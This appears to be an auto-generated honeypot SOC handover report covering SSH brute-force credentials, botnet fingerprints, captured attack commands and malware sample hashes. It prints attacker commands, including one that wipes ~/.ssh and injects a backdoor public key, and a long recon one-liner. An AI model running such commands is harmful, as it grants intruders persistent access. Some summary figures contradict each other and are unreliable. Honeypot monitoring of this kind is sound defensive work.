# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-08-07 |
| **Generated At** | 2026-08-07T14:58:18Z |
| **Shift Time** | 14:58 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **305** |
| Confirmed Threats | **0** |
| False Positives Filtered | **305** (100.0%) |
| Unique Attacker IPs | **83** |
| Countries of Origin | **0** |
| High Severity Cases | **87** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **218** |
| Malware Samples Analyzed | **2** HIGH · **24** MED · 20 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **106** |
| Unique Credential Pairs | **75** |
| Unique Usernames | **17** |
| Unique Passwords | **40** |
| Successful Auth Pairs | **99** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 16 |
| `admin` | 11 |
| `support` | 9 |
| `deploy` | 9 |
| `centos` | 8 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `password` | 8 |
| `12345` | 7 |
| `12345678` | 7 |
| `123123` | 5 |
| `123456` | 5 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `5up` | 5 |
| `test` | `test77` | 5 |
| `support` | `support3` | 4 |
| `centos` | `abc123` | 4 |
| `root` | `1990` | 4 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `admin` | `654321` | `195.178.110.228` | 2026-08-07T12:56:01 |
| `support` | `support3` | `65.20.153.146` | 2026-08-07T12:56:05 |
| `support` | `support3` | `112.161.26.125` | 2026-08-07T12:56:13 |
| `admin` | `Admin123` | `195.178.110.228` | 2026-08-07T12:57:33 |
| `admin` | `secret` | `178.178.222.59` | 2026-08-07T12:58:48 |
| `admin` | `P@ssw0rd` | `195.178.110.228` | 2026-08-07T12:59:07 |
| `default` | `default2022` | `218.21.241.50` | 2026-08-07T12:59:39 |
| `admin` | `admin` | `195.178.110.228` | 2026-08-07T13:00:40 |
| `admin` | `passw0rd` | `195.178.110.228` | 2026-08-07T13:02:15 |
| `default` | `default2022` | `10.0.0.73` | 2026-08-07T13:03:06 |
| `admin` | `password` | `195.178.110.228` | 2026-08-07T13:03:49 |
| `admin` | `password1` | `195.178.110.228` | 2026-08-07T13:05:24 |
| `admin` | `qwerty` | `195.178.110.228` | 2026-08-07T13:07:00 |
| `admin1` | `123123` | `195.178.110.228` | 2026-08-07T13:08:45 |
| `admin1` | `12345` | `195.178.110.228` | 2026-08-07T13:10:33 |
| `admin1` | `123456` | `195.178.110.228` | 2026-08-07T13:12:19 |
| `root` | `﻿------fuck------` | `121.224.5.228` | 2026-08-07T13:13:27 |
| `admin1` | `password` | `195.178.110.228` | 2026-08-07T13:14:03 |
| `admin` | `secret` | `196.203.231.220` | 2026-08-07T13:15:02 |
| `administrator` | `123123` | `195.178.110.228` | 2026-08-07T13:15:42 |
| `administrator` | `12345` | `195.178.110.228` | 2026-08-07T13:17:14 |
| `administrator` | `123456` | `195.178.110.228` | 2026-08-07T13:18:44 |
| `administrator` | `1234567` | `195.178.110.228` | 2026-08-07T13:20:20 |
| `administrator` | `12345678` | `195.178.110.228` | 2026-08-07T13:21:58 |
| `support` | `support` | `176.53.159.196` | 2026-08-07T13:22:59 |
| `administrator` | `123456789` | `195.178.110.228` | 2026-08-07T13:23:37 |
| `administrator` | `password` | `195.178.110.228` | 2026-08-07T13:25:13 |
| `support` | `support3` | `213.234.9.218` | 2026-08-07T13:25:24 |
| `support` | `support3` | `220.246.42.212` | 2026-08-07T13:25:32 |
| `default` | `default2001` | `121.179.93.147` | 2026-08-07T13:26:20 |
| `apache` | `12345678` | `195.178.110.228` | 2026-08-07T13:26:52 |
| `test1` | `1234` | `111.70.11.15` | 2026-08-07T13:28:03 |
| `anonymous` | `Exabyte` | `10.0.0.73` | 2026-08-07T13:28:14 |
| `test1` | `1234` | `144.22.210.132` | 2026-08-07T13:28:16 |
| `apache` | `password` | `195.178.110.228` | 2026-08-07T13:28:35 |
| `backup` | `123` | `195.178.110.228` | 2026-08-07T13:30:12 |
| `root` | `5up` | `182.156.35.238` | 2026-08-07T13:30:42 |
| `centos` | `abc123` | `10.0.0.73` | 2026-08-07T13:31:36 |
| `backup` | `12345678` | `195.178.110.228` | 2026-08-07T13:31:40 |
| `backup` | `backup` | `195.178.110.228` | 2026-08-07T13:33:09 |
| `centos` | `abc123` | `24.97.253.246` | 2026-08-07T13:33:11 |
| `centos` | `abc123` | `203.123.219.137` | 2026-08-07T13:33:19 |
| `backup` | `backup123` | `195.178.110.228` | 2026-08-07T13:34:40 |
| `backup` | `password` | `195.178.110.228` | 2026-08-07T13:36:16 |
| `centos` | `12345678` | `195.178.110.228` | 2026-08-07T13:37:51 |
| `centos` | `654321` | `195.178.110.228` | 2026-08-07T13:39:32 |
| `centos` | `centos` | `195.178.110.228` | 2026-08-07T13:41:16 |
| `root` | `5up` | `10.0.0.73` | 2026-08-07T13:42:41 |
| `centos` | `centos123` | `195.178.110.228` | 2026-08-07T13:42:54 |
| `root` | `1990` | `10.0.0.73` | 2026-08-07T13:43:42 |
| `debian` | `111111` | `195.178.110.228` | 2026-08-07T13:44:29 |
| `debian` | `123123` | `195.178.110.228` | 2026-08-07T13:46:05 |
| `debian` | `12345` | `195.178.110.228` | 2026-08-07T13:47:41 |
| `debian` | `123456` | `195.178.110.228` | 2026-08-07T13:49:15 |
| `support` | `support2001` | `124.152.90.68` | 2026-08-07T13:49:41 |
| `debian` | `12345678` | `195.178.110.228` | 2026-08-07T13:50:47 |
| `debian` | `123456789` | `195.178.110.228` | 2026-08-07T13:52:27 |
| `debian` | `password` | `195.178.110.228` | 2026-08-07T13:54:01 |
| `debian` | `qwerty` | `195.178.110.228` | 2026-08-07T13:55:33 |
| `deploy` | `111111` | `195.178.110.228` | 2026-08-07T13:57:01 |
| `deploy` | `123123` | `195.178.110.228` | 2026-08-07T13:58:28 |
| `deploy` | `12345` | `195.178.110.228` | 2026-08-07T13:59:55 |
| `root` | `5up` | `186.235.193.170` | 2026-08-07T14:00:19 |
| `root` | `5up` | `211.223.41.90` | 2026-08-07T14:00:32 |
| `deploy` | `123456` | `195.178.110.228` | 2026-08-07T14:01:24 |
| `root` | `1990` | `191.241.142.170` | 2026-08-07T14:02:48 |
| `deploy` | `1234567` | `195.178.110.228` | 2026-08-07T14:02:52 |
| `root` | `1990` | `192.34.128.202` | 2026-08-07T14:02:56 |
| `deploy` | `12345678` | `195.178.110.228` | 2026-08-07T14:04:19 |
| `root` | `1234567890` | `41.74.91.200` | 2026-08-07T14:05:20 |
| `ftp` | `video` | `177.174.0.3` | 2026-08-07T14:05:44 |
| `deploy` | `123456789` | `195.178.110.228` | 2026-08-07T14:05:49 |
| `ftp` | `video` | `196.188.187.85` | 2026-08-07T14:05:57 |
| `support` | `support33` | `10.0.0.73` | 2026-08-07T14:06:25 |
| `deploy` | `password` | `195.178.110.228` | 2026-08-07T14:07:18 |
| `support` | `support33` | `117.69.255.239` | 2026-08-07T14:08:14 |
| `deploy` | `qwerty` | `195.178.110.228` | 2026-08-07T14:08:50 |
| `developer` | `123123` | `195.178.110.228` | 2026-08-07T14:10:14 |
| `developer` | `12345` | `195.178.110.228` | 2026-08-07T14:11:39 |
| `default` | `12345` | `10.0.0.73` | 2026-08-07T14:13:07 |
| `developer` | `123456` | `195.178.110.228` | 2026-08-07T14:13:07 |
| `developer` | `1234567` | `195.178.110.228` | 2026-08-07T14:14:32 |
| `developer` | `12345678` | `195.178.110.228` | 2026-08-07T14:16:00 |
| `ftp` | `video` | `10.0.0.73` | 2026-08-07T14:17:25 |
| `developer` | `123456789` | `195.178.110.228` | 2026-08-07T14:17:26 |
| `test` | `test77` | `10.0.0.73` | 2026-08-07T14:18:38 |
| `developer` | `password` | `195.178.110.228` | 2026-08-07T14:18:54 |
| `support` | `support33` | `61.2.228.177` | 2026-08-07T14:24:36 |
| `root` | `root2003` | `221.182.185.190` | 2026-08-07T14:32:45 |
| `root` | `root2003` | `207.219.221.101` | 2026-08-07T14:35:53 |
| `root` | `root2003` | `62.201.212.54` | 2026-08-07T14:36:04 |
| `test` | `test77` | `62.192.226.83` | 2026-08-07T14:37:39 |
| `test` | `test77` | `103.93.37.178` | 2026-08-07T14:37:42 |
| `test` | `test77` | `101.13.4.119` | 2026-08-07T14:37:48 |
| `root` | `root@123` | `120.52.18.141` | 2026-08-07T14:39:01 |
| `student` | `student` | `68.7.114.69` | 2026-08-07T14:40:33 |
| `admin` | `admin` | `10.0.0.73` | 2026-08-07T14:45:47 |
| `student` | `student` | `10.0.0.73` | 2026-08-07T14:52:18 |
| `root` | `!QAZ2wsx#EDC` | `10.0.0.73` | 2026-08-07T14:53:23 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **305** |
| Sessions with Fingerprint | **8** |
| Unique HASSH Fingerprints | **8** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 57 |
| OpenSSH | 32 |
| libssh | 8 |
| Paramiko (Python) | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `2ec37a7cc8da...` | Mirai/variant | 54 | 1 |
| `acaa53e0a7d7...` | Mirai/variant | 32 | 32 |
| `a704be057881...` | Mirai/variant | 2 | 1 |
| `98f63c4d9c87...` | Generic scanner | 1 | 1 |
| `eff4c24daffc...` | Modern SSH client | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `2ec37a7cc8da...` | Go SSH scanner | 54 | 1 | Mirai/variant |
| `acaa53e0a7d7...` | OpenSSH | 32 | 32 | Mirai/variant |
| `95420f9d932d...` | libssh | 7 | 3 | — |
| `a704be057881...` | Paramiko (Python) | 2 | 1 | Mirai/variant |
| `98f63c4d9c87...` | Go SSH scanner | 1 | 1 | Generic scanner |
| `eff4c24daffc...` | Go SSH scanner | 1 | 1 | Modern SSH client |
| `98ddc5604ef6...` | Go SSH scanner | 1 | 1 | Modern SSH client |
| `f555226df196...` | libssh | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **4** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 54 | 1 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `195.178.110.228`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `120.52.18.141`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **83** |
| Unique ASNs | **63** |
| High-Risk ASNs | **0** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS46562` | Performive LLC | 5 | LOW |
| `AS213412` | ONYPHE SAS | 4 | LOW |
| `AS22773` | Cox Communications Inc. | 4 | LOW |
| `AS9808` | China Mobile Communications Group Co., Ltd. | 3 | LOW |
| `AS4766` | Korea Telecom | 3 | LOW |
| `AS203214` | Hulum Almustakbal Company for Communication Engineering and Services Ltd | 2 | LOW |
| `AS4134` | CHINANET BACKBONE | 2 | LOW |
| `AS63949` | Akamai Connected Cloud | 2 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (0)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

_No priority cases this shift. All confirmed sessions were credential scans only._

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

_No reconnaissance sessions this shift._

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 87/100 | 🔴 HIGH | **42/74** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 82/100 | 🔴 HIGH | **30/75** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 40/100 | 🟡 MEDIUM | **26/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **24/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 50/100 | 🟡 MEDIUM | **27/74** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `287962211de7bcadb39f7576732438b43ee6aab420ec23c29a9d12a8151a547f` | ELF Binary (Linux executable) (x86 32-bit) | `287962211de7bcad...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `2f206563640dd66a743ffd493ce0e3c31a8fc5a24b9f5d2b540fc22d45c13d66` | ELF Binary (Linux executable) (x86 32-bit) | `2f206563640dd66a...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `31d4181843b1ed10a7e7cb3f108f6d6c50a7a4452ee52ddacabe8ca77260615e` | Bash Script | `31d4181843b1ed10...` | 60/100 | 🟡 MEDIUM | **26/75** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

---

## 🌐 Top Attacker IPs by Abuse Score

_No enriched IPs with abuse scores available._

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 99 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 87 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 54 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 54 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 54 |

---

## 🔕 False Positive Summary (305 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 305 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 305 cases |
| Tool 34  | Credential Extractor        | ✅ 106 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 8 fingerprints |
| Tool 36  | Command Clustering          | ✅ 4 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 83 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 305 filtered (100.0%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 63 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 22 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 0 priority case(s) shown individually · 0 recon entry/entries in table (0 group(s) consolidating 0 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-08-07T14:58:18Z_
